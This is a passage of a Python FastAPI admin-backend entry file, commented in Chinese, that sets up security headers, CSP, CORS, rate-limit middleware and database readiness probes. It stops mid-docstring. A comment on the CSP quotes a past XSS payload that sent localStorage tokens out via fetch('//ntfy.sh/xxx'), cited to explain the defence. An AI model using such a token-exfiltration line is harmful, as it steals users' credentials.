"""管理后台 FastAPI 入口：登录、挂载路由、托管前端静态页、启动时建库建表。"""
import asyncio
import gzip as _gzip
import hashlib
import logging
import os
import threading
import time
from pathlib import Path

from fastapi import Depends, FastAPI, Form, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

from admin.config import settings
from admin.db import SessionLocal, get_db, init_db, wait_database_ready
from sqlalchemy.orm import Session
from admin.models import SystemSetting
from admin import env_guard, session_store
from admin.routers import (accounts, credits, groups,
                           growth, keys, login as login_router, logs, models,
                           model_market_key as model_market_key_router,
                           proxy, proxies, schedules, sessions as sessions_router,
                           stats, sync)
from admin.ratelimit import (clear_login_delay, client_ip_from_request,
                             clear_failures, is_locked, note_login_failure,
                             record_failure, reserve_login_delay)
from admin.security import (
    create_admin_token,
    hash_password,
    password_weakness,
    require_admin,
    verify_admin_token,
    verify_password,
)
from starlette.concurrency import run_in_threadpool
from starlette.middleware.gzip import GZipMiddleware
from admin.gateway_limits import GatewayAdmissionMiddleware
from admin.ip_access import IPBlockMiddleware
from admin.routers import join_invites
join_invites_router = join_invites.router
from admin.public_auth import router as public_auth_router
from admin.routers import releases
from admin.routers import audio
from admin.routers import images
from admin.routers import videos
from admin.routers import agent as agent_router
from admin.routers import mcp as mcp_router
from admin.routers import growth_center
from admin.routers import ip_management
from admin import credit_journal  # register transactional balance observations
from admin.routers import maintenance

logger = logging.getLogger("admin.server")


class InvitationSettingIn(BaseModel):
    value: str = Field(max_length=2048)


def _ensure_admin_logging() -> None:
    """给 `admin.*` 日志挂上 handler，让 INFO 级诊断日志真的能落盘。

    为什么需要：uvicorn 只给自己那几个 logger（uvicorn/uvicorn.error/
    uvicorn.access）配 handler，**root logger 保持默认的 WARNING 且无 handler**。
    于是本项目里所有 `logging.getLogger("admin.xxx")` 打出的 INFO/DEBUG
    全部被静默丢弃 —— 包括手机号登录链路的排障日志（轮询状态、上游验证结果、
    为什么兑换失败）。表现就是「日志里只有 access log，看不出功能到底跑没跑」，
    排查问题时非常难受。

    这里显式给 `admin` 这棵 logger 树挂一个 StreamHandler（stdout），
    而 main.py 本来就是 subprocess.stdout -> logs/admin.log，所以能落盘。
    只挂一次（用标记位防重复，`--reload` 或多 worker 下会重复进入本函数）。
    """
    root_admin = logging.getLogger("admin")
    if getattr(root_admin, "_wb_logging_ready", False):
        return
    h = logging.StreamHandler()
    h.setFormatter(logging.Formatter(
        "%(asctime)s %(levelname)s [%(name)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"))
    root_admin.addHandler(h)
    root_admin.setLevel(logging.INFO)
    # 不要把日志再往 root 传：root 没有 handler，传上去只会在
    # 「basicConfig 被别人的库调用过」时打出重复行。
    root_admin.propagate = False
    root_admin._wb_logging_ready = True


_ensure_admin_logging()

# 可选内嵌独立网关 converter：把它挂到 /gw 前缀下，实现「单端口单进程」部署。
# converter 用本机桌面登录态直连后端，并额外提供 /v1/responses、/v1/messages（Anthropic）、
# /v1/balance、/user/balance（DeepSeek 兼容）等协议；与管理后台自带的
# /v1/chat/completions、/v1/models（带 Key 配额托管）路径互不冲突。缺依赖时自动降级为只跑管理后台。
try:
    if os.getenv("WORKBUDDY_ANDROID") == "1":
        raise ImportError("Android uses the account-pool /v1 gateway")
    _CONVERTER_EMBEDDED = False   # /gw 已下线，不再导入 converter
except Exception:  # pragma: no cover - 降级分支
    _CONVERTER_EMBEDDED = False

STATIC_DIR = Path(__file__).resolve().parent / "static"

#: 文档路由常挂、由中间件实时门禁（后台「运行配置」切换 ENABLE_DOCS
#: 即时生效）。默认关闭 —— 关闭时对外表现与不挂路由完全一致（404）。
_DOCS_PATHS = {"/docs", "/docs/oauth2-redirect", "/redoc", "/openapi.json",
               }

app = FastAPI(title="WorkBuddy 共享管理后台", version="1.0",
              docs_url="/docs", redoc_url="/redoc", openapi_url="/openapi.json")

#: 生产启动断言：配置不合规就让进程起不来。
#:
#: 放在 app 创建之后、注册任何路由之前 —— 越早失败，越不会出现
#: 「服务已经监听端口、但策略没生效」的窗口。
#: 非 prod 环境本函数直接返回，不影响本地开发与测试。
env_guard.assert_boot_policy()


@app.middleware("http")
async def _prod_block_privileged_paths(request: Request, call_next):
    """生产环境把「任意文件系统 / 进程控制」类接口直接打成 404。

    为什么在中间件层做，而不是依赖路由不挂载：
      * 平台目录是可裁剪的，`include_router` 成败取决于一堆 try/except；
        漏挂是"没这个功能"，误挂就是"把宿主机交出去"。
      * 这里做的是**第二道闸**：即使路由被挂上、即使有人后来改了
        `include_router` 的条件，生产也访问不到。
    """
    if env_guard.is_prod_blocked(request.url.path):
        return JSONResponse(status_code=404, content={"detail": "Not Found"})
    return await call_next(request)

@app.get("/api/settings/invitation")
def get_invitation_setting(_: bool = Depends(require_admin), db=Depends(get_db)):
    from admin.invitation import current
    return current(db)


@app.put("/api/settings/invitation")
def put_invitation_setting(body: InvitationSettingIn, _: bool = Depends(require_admin), db=Depends(get_db)):
    from admin.invitation import save
    try:
        return save(body.value, db)
    except ValueError as exc:
        raise HTTPException(400, detail=str(exc)) from exc


# CORS：共享网关以 Authorization 头鉴权、不使用 Cookie，故关闭 credentials；
# 避免 `allow_origins=["*"] + allow_credentials=True` 的危险组合。
#
# ⚠️ 顺序很重要：`add_middleware` 是**前插**，先注册者在最内层。
# 多平台转发必须在这里**最先**注册 —— 它要在安全响应头/限流/准入之后才看到
# 请求，但在路由之前接管 `/v1/*`。默认平台（workbuddy）原样穿过，行为不变。
from admin.platform.dispatch import PlatformDispatchMiddleware
from admin.platform.loader import load_platforms

load_platforms()
app.add_middleware(PlatformDispatchMiddleware)

app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.CORS_ORIGINS,
    allow_credentials=False,
    allow_headers=["*"],
    allow_methods=["*"],
)


@app.middleware("http")
async def _join_gate_middleware(request: Request, call_next):
    """join 入口的统一门禁：没有有效访问 Cookie 一律 404。

    覆盖 `/join`、全部 `/api/join/*` 与聚合入口 `/api/open/*`，但**排除**三类：
      * `/api/join/ticket/exchange` —— 它就是来换 Cookie 的；
      * `/api/join/gate/*`         —— 后台总闸，自己要求管理员鉴权；
      * `/api/join/invites*`       —— 后台邀请码管理，同上。

    返回体与"页面不存在"完全一致：不告诉探测者"入口存在但你没票"。
    """
    path = request.url.path
    is_join = (path in ("/join", "/join/", "/static/join.html")
               or path.startswith("/api/join/")
               or path.startswith("/api/open/"))
    if is_join and not (
        path == "/api/join/ticket/exchange"
        or path.startswith("/api/join/gate/")
        or path.startswith("/api/join/invites")
        or path.startswith("/api/open/admin/")
    ):
        def _check() -> bool:
            from admin import join_gate as _jg
            with SessionLocal() as db:
                return bool(_jg.check_access(db, request.cookies.get(_jg.COOKIE_NAME, "")))

        try:
            # 第 4 轮 R4-BE-07：同步查库离开事件循环（公开入口，可被刷）。
            from starlette.concurrency import run_in_threadpool as _rit
            allowed = await _rit(_check)
        except Exception:  # noqa: BLE001 - 数据库不可用时 fail-closed
            allowed = False
        if not allowed:
            return JSONResponse(status_code=404, content={"detail": "Not Found"})
    return await call_next(request)


#: 后台页面统一 CSP —— 旧版 `/admin` 与新版 `/admin/v2` 共用这一条。
#:
#: 为什么抽成常量、而不是各写一套：这份策略是「够用且不宽松」的交集，
#: 新版 Vite 产物的每一项依赖它都能满足 ——
#:   * module script / CSS：`script-src 'self'`、`style-src 'self'`；
#:   * woff2/woff 字体：`font-src 'self'`（同源，构建后 CSS 里是
#:     `/admin/v2/assets/*.woff2` 绝对路径，没有外链字体）；
#:   * 图标 png/svg 与图表截图：`img-src 'self' data: blob:`；
#:   * Naive UI 运行时注入的 `<style>`：`style-src` 的 `'unsafe-inline'`；
#:   * ECharts canvas：canvas 不受 CSP 约束，不需要额外指令。
#: 构建产物里**没有** eval / new Function / Worker（构建后逐文件 grep 过），
#: 所以不需要 `'unsafe-eval'`，也不需要单独的 `worker-src`。
#:
#: 抽成常量的另一个原因：新版路由在响应上**显式**带上它，这样即使以后有人
#: 改了中间件的路径分支，新版页面也不会静默丢掉 CSP。
_ADMIN_CSP = (
    "default-src 'self'; "
    "script-src 'self' 'unsafe-inline'; "
    "style-src 'self' 'unsafe-inline'; "
    "img-src 'self' data: blob:; "
    "font-src 'self' data:; "
    "connect-src 'self'; "
    "media-src 'self' blob:; "
    "object-src 'none'; base-uri 'self'; "
    "frame-ancestors 'none'; form-action 'self'"
)


@app.middleware("http")
async def _security_headers(request: Request, call_next):
    """统一安全响应头：防点击劫持 / MIME 嗅探 / 敏感头泄露。"""
    # OpenAPI 文档：默认关闭；**生产强制关闭**。
    #
    # 为什么不能只看 `settings.ENABLE_DOCS`：它可以在「运行配置」里被
    # SystemSetting 覆盖成 1（`admin/runtime_settings.py` 把 ENABLE_DOCS
    # 列为可调项）。生产如果允许一次点击就重新暴露完整攻击面清单，
    # 启动断言那一条就形同虚设。
    if request.url.path in _DOCS_PATHS and (
            not settings.ENABLE_DOCS or env_guard.IS_PROD):
        return JSONResponse(status_code=404, content={"detail": "Not Found"})
    response = await call_next(request)
    response.headers.setdefault("X-Content-Type-Options", "nosniff")
    response.headers.setdefault("X-Frame-Options", "DENY")
    response.headers.setdefault("Referrer-Policy", "no-referrer")
    if request.url.path.startswith(("/api", "/admin")):
        response.headers.setdefault("Cache-Control", "no-store")
    # 所有 HTML 文档统一下发 CSP。
    #
    # 2026-11-02 事故里，载荷执行后第一件事是把 localStorage 里的令牌
    # `fetch('//ntfy.sh/xxx')` 外带。`connect-src 'self'` 直接掐死这条通道 ——
    # 不管 XSS 有没有复发，数据都出不去。这是纵深防御里最便宜的一层。
    #
    # 保留 `'unsafe-inline'` 的原因：index.html 里有 120 个内联 onclick
    # （历史包袱），一次性改成 addEventListener 风险太大；而 'unsafe-inline'
    # 只放行内联代码，**不会**放行 chrome-extension:// 这类跨源 src。
    # 我们自己没有任何 eval / new Function（已逐文件核查），故不需要 'unsafe-eval'。
    _p = request.url.path
    _is_html_doc = (
        (_p.startswith("/admin")
         and not _p.startswith("/admin/assets")
         and not _p.startswith("/admin/v2/assets"))
        or _p in ("/join", "/join/", "/", "/j")
        or (_p.startswith("/static/") and _p.endswith(".html"))
    )
    # 桌面客户端（pywebview / macOS WKWebView）的桥接**是用 eval 注入的**：
    # CSP 不含 'unsafe-eval' 时，注入只完成一半 —— `window.pywebview.api` 是个
    # 空对象、`desktop_login` 之类的函数永远不出现，`pywebviewready` 也不触发
    # （2026-11-23 在真机 WKWebView 上三组对照实测：无 CSP / 加 unsafe-eval
    # 就正常，只有严格 CSP 会断）。Windows 的 WebView2 走自己的脚本通道，
    # 不受这条影响，所以这个问题只在 macOS 上暴露。
    #
    # 只对桌面壳放行（2026-11-24 第 3 轮，安全 P3 / 审查 S-8e）：原来只认
    # `?desktop=1`，任何人发一条带这个参数的链接就能让普通浏览器的后台页
    # CSP 带上 'unsafe-eval'。现在判据见 `_desktop_shell_request()`。
    _desktop_shell = _desktop_shell_request(request)
    _script_src = ("script-src 'self' 'unsafe-inline' 'unsafe-eval'"
                   if _desktop_shell else "script-src 'self' 'unsafe-inline'")
    _admin_csp = ("default-src 'self'; "
                  + _script_src + "; "
                  "style-src 'self' 'unsafe-inline'; "
                  "img-src 'self' data: blob:; "
                  "font-src 'self' data:; "
                  "connect-src 'self'; "
                  "media-src 'self' blob:; "
                  "object-src 'none'; base-uri 'self'; "
                  "frame-ancestors 'none'; form-action 'self'")
    if _is_html_doc:
        response.headers.setdefault("Content-Security-Policy", _admin_csp)
    elif (_p not in _DOCS_PATHS
          and (response.headers.get("content-type") or "").lower().startswith("text/html")):
        # 2026-11-24（安全 S1）：原来 CSP 只按路径白名单下发，`/api/*`、`/authorize`
        # 返回的 HTML（Trae 授权回调页）没有 CSP，回调页一旦有注入就是同源 XSS。
        # 现在**凡是 HTML 响应都带 CSP**：接口类路径默认不许跑任何脚本；
        # 页面自己需要脚本时自带 nonce CSP（这里是 setdefault，不会覆盖）。
        if _p.startswith("/api/") or _p == "/authorize":
            response.headers.setdefault("Content-Security-Policy", _STRICT_HTML_CSP)
        else:
            response.headers.setdefault("Content-Security-Policy", _admin_csp)
    return response


#: 桌面壳专用标识（新版壳应在 UA 里带上，或给请求加这个头）。
DESKTOP_SHELL_UA_TOKEN = "MiraiHub-Desktop"
DESKTOP_SHELL_HEADER = "X-MiraiHub-Desktop"
#: 紧急回退：DESKTOP_CSP_QUERY_LEGACY=1 恢复「只要 ?desktop=1 就放宽」的旧判据。
_DESKTOP_CSP_QUERY_LEGACY = (os.getenv("DESKTOP_CSP_QUERY_LEGACY", "0").strip().lower()
                             in ("1", "true", "yes", "on"))
_LOOPBACK_HOSTS = ("127.0.0.1", "::1", "localhost")


def desktop_shell_request(query_desktop: bool, header_value: str, user_agent: str,
                          local_runtime: bool, client_host: str, host_header: str,
                          legacy: bool = False) -> bool:
    """是否把这次 HTML 请求当作桌面壳（纯函数，便于单测）。

    放宽 'unsafe-eval' 的条件（任一）：
      1. 请求带桌面壳专用头 `X-MiraiHub-Desktop: 1`，或 UA 含 `MiraiHub-Desktop`
         —— 跨站链接无法让受害者浏览器带上自定义头 / 改 UA；
      2. `?desktop=1` **且** 本机客户端运行时（WORKBUDDY_DESKTOP，生产恒 False）
         **且** 对端与 Host 都是回环地址 —— 兼容现有壳（desktop/app.py 只用
         `load_url("http://127.0.0.1:<port>/admin?desktop=1")`，不发自定义头，
         macOS WKWebView 的默认 UA 也没有可识别标记）；
      3. 运维显式打开 DESKTOP_CSP_QUERY_LEGACY=1 时回到旧判据（只看 ?desktop=1）。
    """
    if str(header_value or "").strip() == "1":
        return True
    if DESKTOP_SHELL_UA_TOKEN.lower() in str(user_agent or "").lower():
        return True
    if not query_desktop:
        return False
    if legacy:
        return True
    if not local_runtime:
        return False
    host = str(host_header or "").strip().lower()
    if host.startswith("["):
        host = host[1:].split("]", 1)[0]
    else:
        host = host.rsplit(":", 1)[0] if host.count(":") == 1 else host
    return (str(client_host or "") in _LOOPBACK_HOSTS) and (host in _LOOPBACK_HOSTS)


def _desktop_shell_request(request: Request) -> bool:
    try:
        return desktop_shell_request(
            (request.query_params or {}).get("desktop") == "1",
            request.headers.get(DESKTOP_SHELL_HEADER) or "",
            request.headers.get("user-agent") or "",
            _local_runtime(),
            request.client.host if request.client else "",
            request.headers.get("host") or "",
            legacy=_DESKTOP_CSP_QUERY_LEGACY)
    except Exception:  # noqa: BLE001 - 判不出来就按普通浏览器（严格 CSP）
        return False


#: 接口类路径返回 HTML 时的兜底 CSP：不许脚本、不许外连、不许被嵌套。
_STRICT_HTML_CSP = ("default-src 'none'; style-src 'unsafe-inline'; img-src data:; "
                    "base-uri 'none'; form-action 'none'; frame-ancestors 'none'")


class ApiGZipMiddleware:
    """`/api/*` 响应 gzip（前端第 4 批：首屏接口体积）。

    为什么不直接用 Starlette 的 GZipMiddleware：
      * 它不区分路径，`/v1/*` 网关流式响应也会被包一层（流式 gzip 会攒缓冲，
        直接拖慢首字）；
      * 旧版本不排除 `text/event-stream`，SSE 事件会被压缩缓冲卡住。
    所以这里只做最保守的一种：**只压 `/api/*`、只压声明了 Content-Length 的
    响应**（JSONResponse 就是这样；它穿过 `@app.middleware("http")` 时会被拆成
    几段 `more_body=True`，这里按声明长度攒齐再压）。没有 Content-Length 的
    真流式响应、SSE、超过 8MB 的响应、已编码的响应一律原样透传。

    开关：ADMIN_API_GZIP=0 关闭；ADMIN_API_GZIP_MIN 最小压缩字节数（默认 1024）。
    """

    _COMPRESSIBLE = ("application/json", "application/javascript", "application/xml",
                     "text/", "image/svg+xml")
    #: 声明长度超过它就不攒缓冲（大文件下载之类，压缩收益不抵内存与延迟）。
    MAX_BUFFER = 8 * 1024 * 1024

    def __init__(self, app, minimum_size: int = 1024, compresslevel: int = 5):
        self.app = app
        self.minimum_size = max(0, int(minimum_size))
        self.compresslevel = compresslevel

    @classmethod
    def _compressible(cls, ctype: str) -> bool:
        ctype = (ctype or "").lower()
        if ctype.startswith("text/event-stream"):
            return False
        return (ctype.startswith(cls._COMPRESSIBLE)
                or "+json" in ctype or "+xml" in ctype)

    async def __call__(self, scope, receive, send):
        if scope.get("type") != "http" or not str(scope.get("path") or "").startswith("/api/"):
            return await self.app(scope, receive, send)
        accept = b""
        for key, value in scope.get("headers") or ():
            if key.lower() == b"accept-encoding":
                accept = value.lower()
                break
        if b"gzip" not in accept:
            return await self.app(scope, receive, send)

        state = {"start": None, "passthrough": False, "chunks": [], "size": 0}

        async def _flush_plain(message=None):
            state["passthrough"] = True
            if state["start"] is not None:
                await send(state["start"])
            for chunk in state["chunks"]:
                await send({"type": "http.response.body", "body": chunk, "more_body": True})
            state["chunks"] = []
            if message is not None:
                await send(message)

        async def gzip_send(message):
            kind = message.get("type")
            if state["passthrough"]:
                await send(message)
                return
            if kind == "http.response.start":
                state["start"] = message
                return
            start = state["start"]
            if kind != "http.response.body" or start is None:
                await _flush_plain(message)
                return
            headers = [(k, v) for k, v in (start.get("headers") or [])]
            lower = {k.lower(): v for k, v in headers}
            if not state["chunks"] and not state["size"]:
                # 第一段：决定压不压。
                ctype = lower.get(b"content-type", b"").decode("latin-1")
                cache = lower.get(b"cache-control", b"").decode("latin-1").lower()
                try:
                    declared = int(lower.get(b"content-length", b"-1"))
                except ValueError:
                    declared = -1
                more = bool(message.get("more_body"))
                if ((more and not (0 <= declared <= self.MAX_BUFFER))
                        or (not more and len(message.get("body", b"") or b"") < self.minimum_size)
                        or 0 <= declared < self.minimum_size
                        or b"content-encoding" in lower or not self._compressible(ctype)
                        or int(start.get("status") or 200) in (204, 206, 304)
                        or "no-transform" in cache):
                    await _flush_plain(message)
                    return
            chunk = message.get("body", b"") or b""
            if chunk:
                state["chunks"].append(chunk)
                state["size"] += len(chunk)
            if state["size"] > self.MAX_BUFFER:
                await _flush_plain(None)
                return
            if message.get("more_body"):
                return
            body = b"".join(state["chunks"])
            state["chunks"] = []
            if len(body) < self.minimum_size:
                state["passthrough"] = True
                await send(start)
                await send({"type": "http.response.body", "body": body, "more_body": False})
                return
            if len(body) > 1024 * 1024:
                data = await run_in_threadpool(_gzip.compress, body, self.compresslevel)
            else:
                data = _gzip.compress(body, self.compresslevel)
            if len(data) >= len(body):
                state["passthrough"] = True
                await send(start)
                await send({"type": "http.response.body", "body": body, "more_body": False})
                return
            out = [(k, v) for k, v in headers
                   if k.lower() not in (b"content-length", b"vary")]
            vary = lower.get(b"vary", b"")
            if b"accept-encoding" not in vary.lower():
                vary = (vary + b", Accept-Encoding") if vary else b"Accept-Encoding"
            out += [(b"content-encoding", b"gzip"),
                    (b"content-length", str(len(data)).encode()),
                    (b"vary", vary)]
            state["passthrough"] = True
            await send({**start, "headers": out})
            await send({"type": "http.response.body", "body": data, "more_body": False})

        await self.app(scope, receive, gzip_send)


app.add_middleware(
    GatewayAdmissionMiddleware,
    wait_timeout=getattr(settings, 'GATEWAY_WAIT_TIMEOUT', 15),
    request_timeout=getattr(settings, 'GATEWAY_REQUEST_TIMEOUT', 160),
    dynamic_settings=True,
)
from admin import join_invite
from admin.join_limits import JoinAdmissionMiddleware
app.add_middleware(JoinAdmissionMiddleware, max_active=settings.JOIN_MAX_CONCURRENT)

from admin.request_metrics import TimingMiddleware
app.add_middleware(TimingMiddleware, persist=True)

# 生命周期中间件：原子准入 + 在途计数 + 排空拒绝。
#
# **位置是契约**：目标层序从外到内必须是「封禁/IP 防护 → 生命周期 →
# TimingMiddleware → 原准入队列与业务 dispatch」。add_middleware 是前插
# （后注册更靠外），所以这一行必须夹在 TimingMiddleware 与 IPBlockMiddleware
# 之间 —— 封的 IP 仍先拿到 429，排空 503 不进入计时/准入/计费，已准入的
# 请求（含排队中的）也照样按原限流与超时语义跑完。
from admin.lifecycle import LifecycleMiddleware, get_lifecycle
app.add_middleware(LifecycleMiddleware)

app.add_middleware(IPBlockMiddleware)

# 异常行为守卫必须注册在**最后**（= 最外层）。
#
# 原因：`add_middleware` 是前插，越晚注册越靠外。守卫要在所有业务逻辑之前
# 完成「是否已被封」的判定，否则被封的 IP 仍会打穿到应用层再被拒。
#
# 为什么已有的 `IPBlockMiddleware` 不够：它内部用 `_is_public_gateway_path()`
# 过滤，只保护 `/v1/*`；而事故中攻击者扫的是 `/api/accounts`，两者路径体系
# 完全不同，等于完全没有风控。本中间件不区分路径，全站生效。
# /api 响应 gzip：夹在 IP 封禁与异常守卫之间（守卫仍是最外层，见下）。
if os.getenv("ADMIN_API_GZIP", "1").strip().lower() not in ("0", "false", "no", "off"):
    try:
        _gzip_min = int(os.getenv("ADMIN_API_GZIP_MIN", "1024") or 1024)
    except ValueError:
        _gzip_min = 1024
    app.add_middleware(ApiGZipMiddleware, minimum_size=_gzip_min)

from admin.abuse_guard import AbuseGuardMiddleware
app.add_middleware(AbuseGuardMiddleware)


# ---------------------------------------------------------------------------
# 生命周期接口（CONTRACT 第 2 节，任务 1 交付）
# ---------------------------------------------------------------------------
#
# 两者的「不被排空拒绝」由 LifecycleMiddleware 的豁免表保证（精确方法+路径），
# 而不是撒一层 /api/* 的白名单：业务接口在排空时必须收到 503。


@app.get("/api/app/ready")
def app_ready():
    """匿名、轻量、同源就绪探针。

    等待页、升级闸门与前端都靠它区分「旧代还在排空」与「新代已可接单」。
    只回 {"ready": bool}：不带代号、不带计数，匿名请求看不到任何后台状态。
    """
    ready = get_lifecycle().snapshot()["phase"] == "ready"
    return JSONResponse({"ready": ready}, status_code=200 if ready else 503,
                        headers={"Cache-Control": "no-store"})


@app.get("/api/app/lifecycle", dependencies=[Depends(require_admin)])
def app_lifecycle():
    """当前生命周期快照（需管理员）。字段固定，不含请求原文/账号/密钥/本机路径。"""
    return JSONResponse(get_lifecycle().snapshot(),
                        headers={"Cache-Control": "no-store"})


# ---------------------------------------------------------------------------
# 就绪发布（任务 2 交付）
# ---------------------------------------------------------------------------
#
# 为什么不能「startup 跑完就发布 ready」：
#   * `wait_database_ready()` 只证明「能连上」，证明不了「表已经建好」；
#   * `init_db()` 失败（迁移卡住 / 权限不够 / 库刚被 OOM 杀掉）时进程仍要活着
#     并给出诊断，但**不能**对外说「可以接单」——否则每个业务请求都撞 500；
#   * 降级启动后数据库会自己恢复，要用一次**真实**探测把它接回来，而不是等人工
#     重启；恢复之前迟到的探测也**不许**把准入改回 ready（排空不能被它撤销）。
#
# 「可选预热」（客户端版本发现、平台路径覆盖、更新检查、Node 准备）一律不在这里，
# 它们不挡就绪 —— 就绪只等「必要初始化 + 数据库可用 + 必要表齐」。

#: 就绪所需的最少表：缺任何一张都说明建表/迁移还没跑完。
READY_REQUIRED_TABLES = ("accounts", "api_keys", "usage_logs",
                         "request_audits", "schedules", "system_settings")

#: 降级启动后真实 DB 探测的默认参数（可用环境变量收紧/放宽）。
READINESS_PROBE_TIMEOUT = 5.0
READINESS_PROBE_INTERVAL = 10.0


def _env_float(name: str, default: float) -> float:
    """读一个浮点环境变量；读不出来就用默认值（绝不因为配置写错卡住启动）。"""
    raw = (os.getenv(name, "") or "").strip()
    if not raw:
        return default
    try:
        return float(raw)
    except ValueError:
        return default


def _required_tables_present(engine=None):
    """必要表是否都在。返回 (ok, reason)；reason 只进日志与诊断，不进快照。"""
    from sqlalchemy import inspect as sa_inspect

    from admin.db import engine as default_engine

    target = engine if engine is not None else default_engine
    try:
        existing = set(sa_inspect(target).get_table_names())
    except Exception as exc:  # noqa: BLE001 - 读不到表清单就是「没就绪」
        return False, "读取表清单失败：%s" % type(exc).__name__
    missing = [name for name in READY_REQUIRED_TABLES if name not in existing]
    if missing:
        return False, "缺少必要表：" + "、".join(missing)
    return True, ""


def _database_probe(engine=None):
    """真实数据库就绪探测：独立连接 + SELECT 1 + 必要表齐。

    只读：不建表、不改配置、不启动线程池。降级恢复用它判断「现在能不能接单」。
    """
    from sqlalchemy import text as sa_text

    from admin.db import engine as default_engine

    target = engine if engine is not None else default_engine
    try:
        with target.connect() as connection:
            connection.execute(sa_text("SELECT 1"))
    except Exception as exc:  # noqa: BLE001 - 探测失败是常态，不是异常路径
        return False, "数据库连接失败：%s" % type(exc).__name__
    return _required_tables_present(target)


def _probe_with_timeout(probe, timeout: float):
    """在独立线程里跑一次探测并**给上限**：卡死的连接不许拖住进程。

    为什么不用 `connect_timeout`：库驱动、DNS、连接池排队都可能各自卡住
    （`pool_timeout` 默认 30 秒），逐个配超时太脆；这里统一用「线程 join 上限」。
    """
    box: dict = {}

    def _run():
        try:
            box["value"] = probe()
        except BaseException as exc:  # noqa: BLE001 - 探针自己的异常只算「没就绪」
            box["error"] = exc

    timeout = max(0.01, float(timeout))
    thread = threading.Thread(target=_run, name="wb-db-probe", daemon=True)
    thread.start()
    thread.join(timeout)
    if thread.is_alive():
        return False, "探测超时（>%.1fs）" % timeout
    if "error" in box:
        return False, "探测异常：%s" % type(box["error"]).__name__
    value = box.get("value")
    if isinstance(value, tuple) and len(value) == 2:
        return bool(value[0]), str(value[1] or "")
    return bool(value), ""


class ReadinessProbe:
    """降级启动后的真实 DB 就绪探测：**有超时、单飞、限频**。

    * 超时：每次探测自己 join 上限，卡住的连接不会拖死后续尝试；
    * 单飞：同一时刻只允许一个探测在跑（`poke()` 返回 "busy"），
      避免每轮都开新连接把降级中的库压垮；
    * 限频：两次尝试之间至少隔 `min_interval` 秒（返回 "throttled"）；
    * 排空期间迟到的成功探测**无权**把准入改回 ready：阶段不是 starting 时
      既不补初始化也不发布就绪（`phase_closed`）。

    恢复成功后只补**一次**初始化（`on_recovered`）再发布 ready；之后
    `poke()` 直接返回 "phase_closed"。
    """

    def __init__(self, *, probe=None, on_recovered=None, timeout: float = READINESS_PROBE_TIMEOUT,
                 min_interval: float = READINESS_PROBE_INTERVAL, lifecycle=None):
        self._probe = probe if probe is not None else _database_probe
        self._on_recovered = on_recovered
        self._timeout = max(0.01, float(timeout))
        self._min_interval = max(0.0, float(min_interval))
        self._lifecycle = lifecycle
        self._lock = threading.Lock()
        self._busy = False
        self._stopped = False
        self._thread = None
        self._last_attempt = None
        self.attempts = 0
        self.recovered = False
        #: 最近一次探测结论 (ok, reason)；只用于日志与诊断。
        self.last_result = (False, "")

    # -- 状态 ---------------------------------------------------------------

    @property
    def lifecycle(self):
        return self._lifecycle if self._lifecycle is not None else get_lifecycle()

    @property
    def busy(self) -> bool:
        with self._lock:
            return self._busy

    @property
    def running(self) -> bool:
        thread = self._thread
        return bool(thread is not None and thread.is_alive())

    # -- 探测 ---------------------------------------------------------------

    def poke(self) -> str:
        """跑一次探测。返回 busy/throttled/phase_closed/unavailable/ready/recovery_failed。"""
        with self._lock:
            if self._busy:
                return "busy"
            if self.lifecycle.snapshot()["phase"] != "starting":
                # 已经 ready（重复探测）或已经排空/失败：都不该再补初始化。
                return "phase_closed"
            now = time.monotonic()
            if (self._last_attempt is not None
                    and now - self._last_attempt < self._min_interval):
                return "throttled"
            self._busy = True
            self._last_attempt = now
            self.attempts += 1
        try:
            ok, reason = _probe_with_timeout(self._probe, self._timeout)
            self.last_result = (ok, reason)
            if not ok:
                return "unavailable"
            # 探测期间可能已经开始排空：迟到的成功探测不许把准入改回 ready。
            if self.lifecycle.snapshot()["phase"] != "starting":
                logger.info("数据库已恢复，但本代已经不再等就绪（%s），跳过发布",
                            self.lifecycle.snapshot()["phase"])
                return "phase_closed"
            if self._on_recovered is not None and not self.recovered:
                try:
                    self._on_recovered()
                except Exception:  # noqa: BLE001 - 补初始化失败就继续等下一轮
                    logger.exception("数据库恢复后补初始化失败，稍后重试")
                    return "recovery_failed"
            self.recovered = True
            self.lifecycle.mark_ready()
            logger.info("数据库已在降级模式后恢复：必要初始化补跑完成，已发布就绪")
            return "ready"
        finally:
            with self._lock:
                self._busy = False

    def kick(self) -> bool:
        """拉起后台探测线程（单飞：已在跑就不重复起）。"""
        with self._lock:
            if self._thread is not None and self._thread.is_alive():
                return False
            self._stopped = False
            thread = threading.Thread(target=self._loop, name="wb-ready-probe",
                                      daemon=True)
            self._thread = thread
        thread.start()
        return True

    def stop(self) -> None:
        """停止后台探测（关闭流程调用；正在跑的那次探测会自己结束）。"""
        with self._lock:
            self._stopped = True

    @property
    def stopped(self) -> bool:
        with self._lock:
            return self._stopped

    def _loop(self) -> None:
        while not self.stopped:
            status = self.poke()
            if status in ("ready", "phase_closed"):
                return
            # 限频由 poke() 自己把关，这里只负责别空转。
            deadline = time.monotonic() + max(0.05, self._min_interval)
            while time.monotonic() < deadline:
                if self.stopped:
                    return
                time.sleep(min(0.2, max(0.02, self._min_interval)))


#: 降级启动后的唯一后台探针（多次 startup 复用，不叠加线程）。
_DEGRADED_PROBE = None


def start_degraded_readiness_probe(**kwargs) -> ReadinessProbe:
    """拉起降级就绪探测（单例）。已有在跑的探针时直接返回它。"""
    global _DEGRADED_PROBE
    probe = _DEGRADED_PROBE
    if probe is not None and probe.running:
        return probe
    probe = ReadinessProbe(**kwargs)
    _DEGRADED_PROBE = probe
    probe.kick()
    return probe


def _publish_readiness(*, db_ok, init_ok, tables_ok, reason="") -> dict:
    """就绪发布闸门：必要初始化完成 + 数据库可用 + 必要表齐，缺一不可。"""
    lifecycle = get_lifecycle()
    if db_ok and init_ok and tables_ok:
        snapshot = lifecycle.mark_ready()
        logger.info("生命周期就绪：instance=%s phase=%s",
                    snapshot["instance_id"], snapshot["phase"])
        return snapshot
    snapshot = lifecycle.snapshot()
    logger.warning(
        "暂不发布就绪：db_ok=%s init_ok=%s tables_ok=%s phase=%s %s",
        db_ok, init_ok, tables_ok, snapshot["phase"], reason)
    return snapshot


def _init_after_database_ready() -> dict:
    """数据库可用后**必须补**的一次性初始化；启动路径与降级恢复路径共用。

